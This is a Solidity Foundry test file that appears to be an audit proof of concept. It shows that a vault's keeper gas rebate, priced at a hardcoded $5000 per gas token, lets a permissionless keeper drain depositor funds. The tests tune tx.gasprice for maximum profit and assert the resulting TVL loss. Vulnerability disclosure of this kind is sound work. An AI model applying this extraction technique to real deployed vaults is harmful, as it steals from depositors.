// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test, console2} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {AssetRegistry} from "equivaults/AssetRegistry.sol";
import {EquiVault} from "equivaults/EquiVault.sol";
import {IPriceOracle} from "equivaults/interfaces/IPriceOracle.sol";
import {ISwapRouter} from "equivaults/interfaces/ISwapRouter.sol";

// ---------------------------------------------------------------------------
// Minimal mocks (mirrors of the target's own test mocks; kept local so the PoC
// dir is self-contained apart from the src/lib remap).
// ---------------------------------------------------------------------------

contract MockToken is ERC20 {
    uint8 private immutable _dec;

    constructor(uint8 dec_) ERC20("Mock", "MOCK") {
        _dec = dec_;
    }

    function decimals() public view override returns (uint8) {
        return _dec;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev priceE18 = quote units per whole base token, settable; both-source-down simulation via setFails.
contract MockOracle is IPriceOracle {
    uint256 internal _price;
    uint256 internal _updatedAt;
    bool internal _fails;

    function setPrice(uint256 price, uint256 updatedAt) external {
        _price = price;
        _updatedAt = updatedAt;
    }

    function setFails(bool fails) external {
        _fails = fails;
    }

    function getPrice(address, address) external view returns (uint256, uint256) {
        require(!_fails, "oracle down");
        return (_price, _updatedAt);
    }
}

/// @dev Swaps at the current registered oracle price. feeBps = 0 in this PoC so the ONLY value that
/// leaves the vault during a rebalance is the gas rebate (isolates the leak from DEX cost).
contract MockOracleRoute is ISwapRouter {
    using Math for uint256;

    AssetRegistry public immutable registry;
    IERC20 public immutable settlement;
    uint16 public immutable feeBps;
    uint256 private immutable _settlementScale;

    constructor(AssetRegistry registry_, IERC20 settlement_, uint16 feeBps_) {
        registry = registry_;
        settlement = settlement_;
        feeBps = feeBps_;
        _settlementScale = 10 ** uint256(IERC20Metadata(address(settlement_)).decimals());
    }

    function swapExactIn(address assetIn, address assetOut, uint256 amountIn, uint256 minAmountOut)
        external
        returns (uint256 amountOut)
    {
        require(assetIn == address(settlement) || assetOut == address(settlement), "wrong pair");
        address token = assetIn == address(settlement) ? assetOut : assetIn;
        (uint256 priceE18,) = registry.getPrice(token, address(settlement));
        uint256 tokenScale = 10 ** uint256(registry.assetConfig(token).decimals);

        if (assetIn == address(settlement)) {
            amountOut = amountIn.mulDiv(tokenScale * 1e18, priceE18 * _settlementScale);
        } else {
            amountOut = amountIn.mulDiv(priceE18 * _settlementScale, tokenScale * 1e18);
        }
        amountOut = amountOut * (10_000 - feeBps) / 10_000;
        if (amountOut < minAmountOut) revert SlippageExceeded(minAmountOut, amountOut);

        require(IERC20(assetIn).transferFrom(msg.sender, address(this), amountIn), "in");
        require(IERC20(assetOut).transfer(msg.sender, amountOut), "out");
    }
}

/// @notice PoC: EquiVault reimburses a permissionless rebalance keeper by valuing gas at a HARDCODED
/// $5000/gas-token (RebalanceLib.ETH_SETTLEMENT_PRICE_CAP = 5000e6), never at a live oracle. This is
/// (a) chain-blind: on any chain whose gas token trades far below that (Polygon POL, BNB, AVAX, most
/// L2s, or ETH itself below the break-even) the keeper is over-reimbursed out of depositor TVL, up to
/// MAX_GAS_REBATE (5 units) per drift event, permissionless and repeatable; and (b) partly self-
/// limiting because the reimbursed `gasUsed` covers only the sell leg (~40% of the real tx gas), which
/// puts the break-even gas-token price at ~5000 * reimbursedGas/totalGas (~$2000 for this config).
contract OverRebateTest is Test {
    // Target constants (RebalanceLib / EquiVault).
    uint256 internal constant MAX_GAS_REBATE = 5e6; // 5 settlement units (USDC 6-dec)
    uint256 internal constant PRICE_CAP = 5_000e6; // implied hardcoded $5000/gas-token
    // Sub-cap identity: reimbursedGas*txGasPrice(wei) == rebate * (1e18 / PRICE_CAP) == rebate * 2e8.
    uint256 internal constant WEI_PER_REBATE = 1e18 / PRICE_CAP; // 2e8 wei of *measured* gas per unit rebated
    uint256 internal constant TX_INTRINSIC = 21_500; // EOA intrinsic + ~calldata for the rebalance tx

    uint48 internal constant MAX_PRICE_AGE = 1 hours;
    uint256 internal constant PRICE_A = 100e18;
    uint256 internal constant PRICE_B = 50e18;
    uint256 internal constant EXPOSURE_CAP = 100_000_000e18;

    address internal admin = makeAddr("admin");
    address internal treasury = makeAddr("treasury");
    address internal manager = makeAddr("manager");
    address internal alice = makeAddr("alice"); // honest depositor / victim
    address internal keeper = makeAddr("keeper"); // permissionless attacker

    MockToken internal usdc;
    MockToken internal tokenA;
    MockToken internal tokenB;
    MockOracle internal primaryA;
    MockOracle internal fallbackA;
    MockOracle internal primaryB;
    MockOracle internal fallbackB;
    MockOracleRoute internal routeA;
    MockOracleRoute internal routeB;
    AssetRegistry internal registry;
    EquiVault internal vault;

    function setUp() public {
        vm.warp(1_000_000);
        usdc = new MockToken(6);
        tokenA = new MockToken(18);
        tokenB = new MockToken(6);

        primaryA = new MockOracle();
        fallbackA = new MockOracle();
        primaryB = new MockOracle();
        fallbackB = new MockOracle();
        primaryA.setPrice(PRICE_A, block.timestamp);
        fallbackA.setPrice(99e18, block.timestamp);
        primaryB.setPrice(PRICE_B, block.timestamp);
        fallbackB.setPrice(49e18, block.timestamp);

        registry = new AssetRegistry(admin, treasury);
        routeA = new MockOracleRoute(registry, usdc, 0); // zero DEX fee: isolate the rebate leak
        routeB = new MockOracleRoute(registry, usdc, 0);
        tokenA.mint(address(routeA), 1e30);
        usdc.mint(address(routeA), 1e30);
        tokenB.mint(address(routeB), 1e30);
        usdc.mint(address(routeB), 1e30);

        vm.startPrank(admin);
        registry.registerAsset(address(tokenA), primaryA, fallbackA, address(routeA), EXPOSURE_CAP, MAX_PRICE_AGE);
        registry.registerAsset(address(tokenB), primaryB, fallbackB, address(routeB), EXPOSURE_CAP, MAX_PRICE_AGE);
        vm.stopPrank();

        // Instant timelock, default drift (300 bps) + default rebalance slippage (100 bps).
        address[] memory a = new address[](2);
        a[0] = address(tokenA);
        a[1] = address(tokenB);
        uint16[] memory w = new uint16[](2);
        w[0] = 6_000;
        w[1] = 4_000;
        vault = new EquiVault(
            usdc, registry, manager, a, w, 1_000, 300, EquiVault.TimelockMode.Instant, 0, 100_000_000e6, 0, 0
        );

        // Alice (honest depositor) seeds the vault with 100,000 USDC.
        usdc.mint(alice, 100_000e6);
        vm.startPrank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vault.enter(
            EquiVault.EnterParams({
                settlementIn: 100_000e6,
                receiver: alice,
                minSharesOut: 0,
                minAmountsOut: new uint256[](0),
                deadline: type(uint256).max,
                proposalId: 0
            })
        );
        vm.stopPrank();
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    /// @dev Skew asset A up to `priceE18` so the basket drifts above the 3-point threshold, keeping A
    /// overweight (so rebalance sells A -> settlement and the pool can pay the rebate).
    function _skewAbove(uint256 priceE18) internal {
        primaryA.setPrice(priceE18, block.timestamp);
        (uint256 dev, bool above) = vault.measureDrift();
        assertTrue(above, "drift not above threshold");
        assertGt(dev, vault.driftThresholdBps(), "drift <= threshold");
    }

    /// @dev Executes rebalance as the keeper and returns the rebate AND the full call gas the keeper
    /// actually burns (this is the honest attacker cost; the vault only reimburses a fraction of it).
    function _rebalanceMeasured(uint256 gasPriceWei) internal returns (uint256 rebate, uint256 fullCallGas) {
        vm.txGasPrice(gasPriceWei);
        vm.prank(keeper);
        uint256 g0 = gasleft();
        rebate = vault.rebalance(
            EquiVault.RebalanceParams({deadline: block.timestamp + 1 hours, minAmountsOut: new uint256[](0)})
        );
        fullCallGas = g0 - gasleft();
    }

    function _rebalance(uint256 gasPriceWei) internal returns (uint256 rebate) {
        (rebate,) = _rebalanceMeasured(gasPriceWei);
    }

    // ==================================================================
    // PoC 1 -- the mispricing exists, and the honest break-even
    // ==================================================================

    /// @notice The rebate books the vault-MEASURED gas (the sell leg) at exactly $5000/gas-token, but
    /// that measured slice is only ~40% of the keeper's real tx gas. Net break-even gas-token price =
    /// 5000 * reimbursedGas / totalGas. Below it the keeper profits out of TVL; above it it loses.
    function test_1_mispricing_and_breakeven() public {
        // Warm up so measurements reflect the repeatable steady state (first-ever call pays cold slots).
        _skewAbove(120e18);
        _rebalance(1 gwei);

        _skewAbove(150e18);
        (uint256 rebate, uint256 fullCallGas) = _rebalanceMeasured(1 gwei); // sub-cap
        assertLt(rebate, MAX_GAS_REBATE, "expected sub-cap regime");

        uint256 reimbursedGas = rebate / 5; // exact at 1 gwei: rebate == reimbursedGas * 5
        uint256 totalGas = fullCallGas + TX_INTRINSIC;

        // Identity: the rebate values `reimbursedGas` at $5000/token. rebate/reimbursedGasCost == 5000/P.
        uint256 reimbursedCostUsdc_at3000 = reimbursedGas * 1 gwei * 3000 / 1e12;
        assertEq(rebate * 3000, reimbursedCostUsdc_at3000 * 5000, "measured-gas is not booked at $5000/token");

        // Honest break-even over the keeper's REAL gas: P* = 5000 * reimbursedGas / totalGas.
        uint256 breakeven = 5000 * reimbursedGas / totalGas;
        console2.log("--- PoC 1: mispricing + break-even ---");
        console2.log("reimbursed gasUsed (vault)    :", reimbursedGas);
        console2.log("keeper real total tx gas      :", totalGas);
        console2.log("ratio total/reimbursed (x1000):", totalGas * 1000 / reimbursedGas);
        console2.log("break-even gas-token price ($):", breakeven);
        assertGt(breakeven, 1000, "break-even implausibly low");
        assertLt(breakeven, 3000, "break-even should sit well under the $5000 cap");
    }

    // ==================================================================
    // PoC 2 -- honest profit table across gas-token prices / chains
    // ==================================================================

    /// @notice Keeper tunes tx.gasprice so the rebate sits near the cap while spending minimal gas, then
    /// we price the keeper's REAL total gas at a range of gas-token prices (each ~ a different chain).
    /// Profit = rebate - realTotalGasCost. Positive below the break-even, negative above it. Also proves
    /// the settlement paid comes straight out of totalAssets() (depositor value).
    function test_2_profit_table_and_tvl_drain() public {
        _skewAbove(120e18);
        _rebalance(1 gwei); // warm-up

        _skewAbove(150e18);
        uint256 warmProbe = _rebalance(1 gwei);
        uint256 reimbursedGas = warmProbe / 5;

        // Target rebate = 98% of cap (sub-cap): reimbursedGas * X == 0.98*MAX_GAS_REBATE*2e8.
        uint256 xTarget = (MAX_GAS_REBATE * 98 / 100) * WEI_PER_REBATE / reimbursedGas;
        console2.log("--- PoC 2: honest profit table ---");
        console2.log("chosen tx.gasprice (milligwei):", xTarget * 1000 / 1 gwei);

        _skewAbove(180e18);
        uint256 navBefore = vault.totalAssets();
        uint256 aliceClaimBefore = vault.quoteExitValue(vault.balanceOf(alice));
        uint256 keeperBefore = usdc.balanceOf(keeper);

        (uint256 rebate, uint256 fullCallGas) = _rebalanceMeasured(xTarget);
        uint256 totalGas = fullCallGas + TX_INTRINSIC;
        uint256 realCostWei = totalGas * xTarget;

        // The rebate is drawn straight out of TVL: with zero DEX fee the ONLY value leaving the basket
        // is the rebate, so totalAssets() and Alice's claimable value each drop by ~rebate.
        assertEq(usdc.balanceOf(keeper) - keeperBefore, rebate, "keeper settlement gain != rebate");
        assertApproxEqAbs(navBefore - vault.totalAssets(), rebate, rebate / 1000 + 10, "TVL drop != rebate");
        assertApproxEqAbs(
            aliceClaimBefore - vault.quoteExitValue(vault.balanceOf(alice)), rebate, rebate / 1000 + 10, "loss != rebate"
        );
        console2.log("rebate paid (6-dec USDC)      :", rebate);
        console2.log("keeper real gas (wei)         :", realCostWei);
        console2.log("TVL drop == rebate (6-dec)    :", navBefore - vault.totalAssets());

        uint256 breakeven = rebate * 1e12 / realCostWei; // gas-token price where profit == 0
        console2.log("break-even gas-token price ($):", breakeven);

        // Profit across representative gas-token prices. Low $ ~ Polygon/BNB/AVAX/L2s or ETH<breakeven;
        // high $ ~ ETH mainnet. profit = rebate - realCost(P).  (6-dec USDC per call)
        uint256[6] memory prices = [uint256(1), 30, 500, 1500, 3000, 4500];
        console2.log("gasTokenUSD | realCost | profit(signed, negative=loss)");
        for (uint256 i = 0; i < prices.length; ++i) {
            uint256 p = prices[i];
            uint256 realCostUsdc = realCostWei * p / 1e12;
            int256 profit = int256(rebate) - int256(realCostUsdc);
            if (profit >= 0) {
                console2.log(p, realCostUsdc, uint256(profit));
            } else {
                console2.log("  (loss) price/cost:", p, realCostUsdc);
            }
            if (p < breakeven) assertGt(profit, 0, "should profit below break-even");
            if (p > breakeven) assertLt(profit, 0, "should lose above break-even");
        }
    }

    // ==================================================================
    // PoC 3 -- absolute cap is reachable at realistic gas price
    // ==================================================================

    /// @notice Confirms the hard MAX_GAS_REBATE ceiling is reachable at a realistic single/low-double
    /// digit gwei, and prints the honest max profit per call = rebate(cap) - realTotalGasCost(P).
    function test_3_cap_reachable_and_max_profit() public {
        _skewAbove(120e18);
        _rebalance(1 gwei); // warm-up
        _skewAbove(150e18);
        uint256 reimbursedGas = _rebalance(1 gwei) / 5;

        // 10% margin over the boundary reimbursedGas*X == MAX_GAS_REBATE*2e8 to clamp to the cap.
        uint256 xCap = (MAX_GAS_REBATE * WEI_PER_REBATE) * 110 / 100 / reimbursedGas;
        _skewAbove(180e18);
        (uint256 rebate, uint256 fullCallGas) = _rebalanceMeasured(xCap);
        assertEq(rebate, MAX_GAS_REBATE, "cap not reached");

        uint256 realCostWei = (fullCallGas + TX_INTRINSIC) * xCap;
        console2.log("--- PoC 3: cap reachable ---");
        console2.log("tx.gasprice used (milligwei)  :", xCap * 1000 / 1 gwei); // realistic gwei
        console2.log("rebate (== MAX_GAS_REBATE)    :", rebate);
        console2.log("keeper real gas (wei)         :", realCostWei);
        console2.log("--- max profit @ cap (6-dec USDC; negative=loss) ---");
        uint256[6] memory prices = [uint256(1), 30, 500, 1500, 3000, 4500];
        for (uint256 i = 0; i < prices.length; ++i) {
            uint256 p = prices[i];
            int256 profit = int256(rebate) - int256(realCostWei * p / 1e12);
            console2.log(p, uint256(profit >= 0 ? profit : -profit), profit >= 0 ? "profit" : "loss");
        }
    }
}
